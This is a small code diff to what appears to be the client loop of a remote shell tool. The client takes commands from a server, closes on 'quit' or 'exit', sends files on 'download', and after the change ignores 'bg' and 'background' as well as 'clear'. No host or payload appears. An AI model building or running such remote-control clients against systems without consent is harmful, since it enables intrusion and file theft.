@@ -210,7 +210,7 @@ def shell(sock: socket.socket) -> None:
         if msg_from_server in ["quit", "exit"]:  # Server side connection termination signal
             sock.close()
             break
-        elif msg_from_server == "clear":  # Server side console clear screen (Ignored on client side)
+        elif msg_from_server in ["clear", "bg", "background"]:  # Ignore certain server side keywords
             pass
         elif msg_from_server[:9] == "download ":  # Server side file download signal
             upload_file(sock, msg_from_server[9:])
